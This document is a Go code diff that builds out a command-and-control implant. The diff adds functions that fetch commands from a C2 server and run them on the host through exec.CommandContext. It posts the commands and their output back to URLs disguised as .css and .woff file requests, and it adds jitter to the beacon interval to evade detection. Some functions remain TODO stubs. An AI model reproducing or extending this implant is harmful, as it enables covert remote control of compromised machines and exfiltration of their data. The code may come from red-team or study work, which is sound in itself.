@@ -2,13 +2,18 @@
 package agent
 
 import (
+	"bytes"
+	"context"
 	_ "embed" // Has hte underscore as it is only being used for side efects
 	"encoding/json"
 	"errors"
 	"fmt"
+	"log"
 	"math/rand"
 	"net/http"
+	"os/exec"
 	"slices"
+	"strings"
 	"time"
 )
 
@@ -56,9 +61,6 @@ type FileExtensionInfo struct {
 	Filenames []string `json:"filenames"`
 }
 
-//go:embed agent_config.json
-var configFile []byte // Embeds the agent_config as a json
-
 func ExtractAndCreateAgent(configData []byte) (*Agent, *agentConfig, error) {
 	ac, err := extractAgentConfig(configData)
 	if err != nil {
@@ -101,18 +103,53 @@ func extractAgentConfig(configData []byte) (*agentConfig, error) {
 	return &ac, err
 }
 
-// COMMUNICATION FUNCTIONS
+// COMMAND EXECUTION FUNCTIONS (System and agent modification commands)
 
-// executeBeaconChain executes the entire chain of beaconing including execution and sending back of commands
-func executeBeaconChain(a *Agent) bool {
-	// TODO: Implement beacon chain execution
-	return false
+// executeCommands takes a list of commands and executes them
+func executeCommands(a *Agent, commands []string) []string {
+	// TODO: Implement command execution
+	commandResults := make([]string, len(commands))
+
+	for i, command := range commands {
+		result := executeCommand(a, command)
+		commandResults[i] = result
+	}
+
+	return commandResults
 }
 
-// executePollSequence function to be called to repeatedly poll the agent
-func executePollSequence(a *Agent) bool {
-	// TODO: Implement long polling sequence
-	return false
+// executeCommand executes a single command
+func executeCommand(a *Agent, command string) string {
+	commandParts := strings.Fields(command)
+	if len(commandParts) == 0 {
+		return "Error: empty command"
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, commandParts[0], commandParts[1:]...)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return "Error: command timed out after 30 seconds"
+		}
+		return fmt.Sprintf("Command failed: %v\nOutput: %s", err, string(output))
+	}
+
+	return string(output)
+}
+
+// modificationFlagCheck() checks to see if the flag indicating a modification to the agent should occur on the next cycle exists
+func modificationFlagCheck(a *Agent, commands []string) []string {
+	index := slices.Index(commands, "agent_modification")
+
+	if index != -1 {
+		commands = append(commands[:index], commands[index+1:]...)
+		a.modificationCheck = true
+	}
+
+	return commands
 }
 
 // applyModificationCommands manages the whole flow of applying modification commands
@@ -121,18 +158,93 @@ func applyModificationCommands(a *Agent) bool {
 	return false
 }
 
-// beaconOut beacons back the output of any commands to the C2 server
-func beaconOut(a *Agent, commands []string, results []string) bool {
-	// TODO: Implement beacon back functionality
+// parseModificationCommands takes a list of modification commands and parses them appropriately
+func parseModificationCommands(a *Agent, unparsedCommands *[]string) [][2]string {
+	// TODO: Implement modification command parsing
+	return nil
+}
+
+// handleModificationCommand routes modification commands to appropriate handlers to execute commands
+func handleModificationCommand(a *Agent, cmdType string, cmdValue string) string {
+	// TODO: Implement modification command handling
+	return ""
+}
+
+// COMMUNICATION FUNCTIONS
+
+// executeBeaconChain executes the entire chain of beaconing including execution and sending back of commands
+func executeBeaconChain(a *Agent, ac *agentConfig) bool {
+	if !isBeacon(a) {
+		return false
+	}
+
+	commands, err := beaconIn(a, ac)
+	if err != nil {
+		return false
+	}
+
+	if len(commands) == 0 {
+		return true
+	}
+
+	commands = modificationFlagCheck(a, commands)
+	results := executeCommands(a, commands)
+
+	status, err := beaconOut(a, ac, commands, results)
+	if err != nil {
+		return false
+	}
+
+	return status
+}
+
+// executePollSequence function to be called to repeatedly poll the agent
+func executePollSequence(a *Agent) bool {
+	// TODO: Implement long polling sequence
 	return false
+}
+
+// beaconOut beacons back the output of any commands to the C2 server
+func beaconOut(a *Agent, ac *agentConfig, commands []string, results []string) (bool, error) {
+	// TODO: Implement beacon back functionality
+	if !isBeacon(a) {
+		return false, errors.New("beacon function called while agent was in long poll mode")
+	}
+	url, err := generateURL(a, ac, ".css")
+	if err != nil {
+		return false, err
+	}
+
+	payload := map[string]interface{}{
+		"commands": commands,
+		"results":  results,
+	}
+
+	// Marshal into a json format
+	jsonPayload, err := json.Marshal(payload)
+	if err != nil {
+		return false, err
+	}
+
+	// Create a reader
+	reader := bytes.NewReader(jsonPayload)
+
+	resp, err := a.client.Post(url, "application/json", reader)
+	if err != nil {
+		return false, err
+	}
+
+	defer resp.Body.Close()
+
+	return true, nil
 }
 
 // beaconIn obtains any available commands if there are any
 func beaconIn(a *Agent, ac *agentConfig) ([]string, error) {
+	if !isBeacon(a) {
+		return nil, errors.New("beacon function called while agent was in long poll mode")
+	}
 	url, err := generateURL(a, ac, ".woff")
-
-	fmt.Printf("Generated URL %v", url)
-
 	if err != nil {
 		return nil, err
 	}
@@ -144,7 +256,6 @@ func beaconIn(a *Agent, ac *agentConfig) ([]string, error) {
 
 	// close the response body
 	defer resp.Body.Close()
-
 	// Check HTTP status code
 	if resp.StatusCode == 404 {
 		// No commands available
@@ -169,9 +280,13 @@ func beaconIn(a *Agent, ac *agentConfig) ([]string, error) {
 }
 
 // longPoll performs long polling request for commands
-func longPoll(a *Agent) []string {
-	// TODO: Implement long polling
-	return nil
+func longPoll(a *Agent) ([]string, error) {
+	// Connection being held open is on the server side.
+	// Timeout for the client should be extended
+	if isBeacon(a) {
+		return nil, errors.New("long poll method called while agent is in beacon mode")
+	}
+	return nil, nil
 }
 
 // longPollBack sends long poll results back to server
@@ -190,35 +305,6 @@ func getModificationCommands(a *Agent) []string {
 func sendModificationCommandResults(a *Agent, commands []string, results []string) bool {
 	// TODO: Implement sending modification results
 	return false
-}
-
-// checkForModificationFlag takes a list of execution commands and checks for agent_modification flag
-func checkForModificationFlag(a *Agent, commands []string) {
-	// TODO: Implement modification flag checking
-}
-
-// executeCommands takes a list of commands and executes them
-func executeCommands(a *Agent, commands []string) []string {
-	// TODO: Implement command execution
-	return nil
-}
-
-// executeCommand executes a single command
-func executeCommand(a *Agent, command string) string {
-	// TODO: Implement single command execution
-	return ""
-}
-
-// parseModificationCommands takes a list of modification commands and parses them appropriately
-func parseModificationCommands(a *Agent, unparsedCommands []string) [][2]string {
-	// TODO: Implement modification command parsing
-	return nil
-}
-
-// handleModificationCommand routes modification commands to appropriate handlers
-func handleModificationCommand(a *Agent, cmdType string, cmdValue string) string {
-	// TODO: Implement modification command handling
-	return ""
 }
 
 // generateURL generates a randomized URL using parameters from agent_config.json
@@ -334,28 +420,60 @@ func setWatchdogTimer(a *Agent, timer int) error {
 	return nil
 }
 
-// getBeaconRange returns a range for the beacon as a tuple for jitter
-func getBeaconRange(a *Agent, rangeVal int) (int, int) {
-	// TODO: Implement beacon range calculation
-	return a.beaconInter - rangeVal, a.beaconInter + rangeVal
+// getBeaconJitter returns a random beacon as a time.Duration object with jitter applied
+func getBeaconJitter(a *Agent, rangeVal float64) time.Duration {
+	beaconBase := float64(a.beaconInter)
+	beaconMin := beaconBase - rangeVal
+	beaconMax := beaconBase + rangeVal
+
+	// Ensure minimum is not negative
+	if beaconMin < 0.1 {
+		beaconMin = 0.1
+	}
+
+	// Generate random float between beaconMin and beaconMax
+	jitterRange := beaconMax - beaconMin
+	randomValue := beaconMin + rand.Float64()*jitterRange
+
+	return time.Duration(randomValue * float64(time.Second))
 }
 
 func isModify(a *Agent) bool {
 	return a.modificationCheck
 }
 
-// AgentFromJSON gets all attributes from the agent_config.json file
-// It runs these through the NewAgent function to create an agent
-// TODO: Eventually the parsing should be done using a struct and Marshal
-//
-//	func AgentFromJSON() *Agent {
-//		// Filter through the agent_config json file
-//		jsonFile, err := os.Open("agent_config.json")
-//		if err != nil {
-//			fmt.Println(err)
-//		}
-//
-//		agent := NewAgent()
-//	}
+//go:embed agent_config.json
+var configFile []byte // Embeds the agent_config as a json
+
 func main() {
+	agent, config, err := ExtractAndCreateAgent(configFile)
+	if err != nil {
+		log.Fatalf("Issue with the intitialization of agent: %v", err)
+	}
+
+	// Enter agent loop
+	for isAlive(agent) {
+
+		// Check for the modification commands to the agent's nature
+		if isModify(agent) {
+			// TODO: Application of the modification commands
+
+			// Check if the modification commands killed the agent
+			if !isAlive(agent) {
+				break
+			}
+		}
+
+		if isBeacon(agent) {
+			executeBeaconChain(agent, config)
+			// TODO: In the future have the beaconRangeVal be in config, idc rn
+			interval := getBeaconJitter(agent, 10.0)
+			time.Sleep(interval)
+		} else {
+			for isAlive(agent) && isModify(agent) {
+				executePollSequence(agent)
+			}
+		}
+
+	}
 }
